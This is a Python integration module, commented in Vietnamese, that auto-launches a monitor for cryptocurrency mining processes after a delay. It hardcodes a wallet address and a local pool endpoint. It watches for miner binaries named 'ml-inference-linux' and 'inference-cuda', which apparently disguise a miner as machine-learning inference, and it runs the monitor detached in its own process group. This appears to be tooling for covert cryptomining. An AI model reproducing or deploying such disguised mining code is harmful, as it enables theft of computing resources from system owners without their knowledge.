#!/usr/bin/env python3
"""
🔗 Auto Monitor Integration Module
Module tích hợp tự động kích hoạt mining monitor vào start_mining.py
"""

import threading
import time
import subprocess
import os
import sys
import psutil
from pathlib import Path

class MiningMonitorIntegration:
    """
    **Mining Monitor Integration** (tích hợp giám sát khai thác) - Tự động kích hoạt
    mining output monitoring sau khi mining processes đã khởi động
    """
    
    def __init__(self, logger=None):
        self.logger = logger
        self.monitor_thread = None
        self.monitor_process = None
        self.is_monitoring = False
        
    def log(self, message, level='info'):
        """**Unified logging** (ghi log thống nhất)"""
        if self.logger:
            getattr(self.logger, level)(message)
        else:
            print(f"[{level.upper()}] {message}")
    
    def setup_monitor_environment(self):
        """**Setup environment variables** (thiết lập biến môi trường) cho continuous monitor"""
        env_vars = {
            'LOGS_DIR': './mining_environment/logs',
            'ML_COMMAND': './ml-inference-linux',
            'MINING_SERVER_CPU': '127.0.0.1:4443',
            'MINING_WALLET_CPU': '412iMJt9Gtv8ZkNEoCF6o1QvTChU6vGqrQp1F4sPkVKjWNBaHBgVhLpEn2mHFMD5n43VBCzpAy6dKZjJ8MPU8E99RJdkqE4'
        }
        
        for key, value in env_vars.items():
            os.environ[key] = value
        
        self.log("✅ Monitor environment variables configured")
    
    def wait_for_mining_processes(self, timeout=60):
        """
        **Wait for mining processes** (chờ các tiến trình khai thác) được khởi tạo
        Returns: True nếu tìm thấy processes
        """
        self.log(f"🔍 Waiting for mining processes (timeout: {timeout}s)...")
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            cpu_processes = []
            gpu_processes = []
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if 'ml-inference' in proc.info['name']:
                        cpu_processes.append(proc.info['pid'])
                    elif 'inference-cuda' in proc.info['name']:
                        gpu_processes.append(proc.info['pid'])
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            if cpu_processes or gpu_processes:
                self.log(f"✅ Mining processes detected: CPU={len(cpu_processes)}, GPU={len(gpu_processes)}")
                return True
                
            time.sleep(3)
        
        self.log(f"⚠️ No mining processes found after {timeout}s")
        return False
    
    def start_continuous_monitor(self):
        """**Start continuous mining monitor** (khởi động monitor liên tục) as subprocess"""
        try:
            # Setup environment
            self.setup_monitor_environment()
            
            # Check if continuous_mining_monitor.py exists
            monitor_script = Path('./continuous_mining_monitor.py')
            if not monitor_script.exists():
                self.log("❌ continuous_mining_monitor.py not found", 'error')
                return False
            
            # Start monitor process
            cmd = ['python3', str(monitor_script)]
            
            self.log("🚀 Starting continuous mining monitor subprocess...")
            
            self.monitor_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1,
                preexec_fn=os.setsid if hasattr(os, 'setsid') else None
            )
            
            self.log(f"✅ Continuous monitor started (PID: {self.monitor_process.pid})")
            self.is_monitoring = True
            return True
            
        except Exception as e:
            self.log(f"❌ Failed to start continuous monitor: {e}", 'error')
            return False
    
    def monitor_activation_thread(self, delay=45):
        """
        **Monitor Activation Thread** (luồng kích hoạt giám sát) - Chạy song song với main threads
        Args:
            delay: Thời gian chờ (giây) trước khi kích hoạt monitor
        """
        try:
            self.log(f"🕒 Monitor activation thread started (delay: {delay}s)")
            
            # Initial delay để mining processes có thời gian khởi động
            time.sleep(delay)
            
            # Wait for mining processes
            if self.wait_for_mining_processes():
                # Start continuous monitor
                if self.start_continuous_monitor():
                    self.log("🎯 Auto mining monitor successfully activated!")
                else:
                    self.log("❌ Failed to activate mining monitor", 'error')
            else:
                self.log("❌ Cannot activate monitor - no mining processes", 'error')
                
        except Exception as e:
            self.log(f"❌ Monitor activation thread error: {e}", 'error')
    
    def integrate_with_start_mining(self, activation_delay=45):
        """
        **Integrate with start_mining.py** (tích hợp với start_mining.py) - Khởi động monitor thread
        
        Args:
            activation_delay: Thời gian chờ (giây) trước khi kích hoạt monitor
        """
        if self.monitor_thread and self.monitor_thread.is_alive():
            self.log("⚠️ Monitor thread already running")
            return
            
        # Start monitor activation thread
        self.monitor_thread = threading.Thread(
            target=self.monitor_activation_thread,
            args=(activation_delay,),
            daemon=True,
            name="MiningMonitorActivation"
        )
        
        self.monitor_thread.start()
        self.log(f"✅ Auto mining monitor integration activated (delay: {activation_delay}s)")
    
    def stop_monitoring(self):
        """**Stop monitoring processes** (dừng các tiến trình giám sát)"""
        if self.monitor_process and self.monitor_process.poll() is None:
            self.log("🛑 Stopping continuous monitor...")
            
            try:
                # Terminate process group if possible
                if hasattr(os, 'killpg'):
                    os.killpg(os.getpgid(self.monitor_process.pid), 15)  # SIGTERM
                else:
                    self.monitor_process.terminate()
                
                # Wait for graceful shutdown
                self.monitor_process.wait(timeout=10)
                self.log("✅ Monitor stopped gracefully")
                
            except subprocess.TimeoutExpired:
                self.log("⚠️ Force killing monitor...")
                if hasattr(os, 'killpg'):
                    os.killpg(os.getpgid(self.monitor_process.pid), 9)  # SIGKILL
                else:
                    self.monitor_process.kill()
                self.monitor_process.wait()
                self.log("✅ Monitor force stopped")
            except Exception as e:
                self.log(f"⚠️ Error stopping monitor: {e}", 'warning')
            
            self.is_monitoring = False
            self.monitor_process = None

# Global instance for integration
_monitor_integration = None

def get_monitor_integration(logger=None):
    """**Get Monitor Integration Singleton** (lấy singleton tích hợp monitor)"""
    global _monitor_integration
    if _monitor_integration is None:
        _monitor_integration = MiningMonitorIntegration(logger)
    return _monitor_integration

def auto_activate_mining_monitor(logger=None, delay=45):
    """
    **Auto Activate Mining Monitor** (tự động kích hoạt giám sát khai thác)
    
    Function tiện lợi để tích hợp vào start_mining.py:
    
    ```python
    from mining_environment.scripts.auto_monitor_integration import auto_activate_mining_monitor
    
    # Trong main() function của start_mining.py:
    auto_activate_mining_monitor(logger, delay=45)
    ```
    
    Args:
        logger: Logger instance từ start_mining.py
        delay: Thời gian chờ (giây) trước khi kích hoạt monitor
    """
    integration = get_monitor_integration(logger)
    integration.integrate_with_start_mining(activation_delay=delay)
    return integration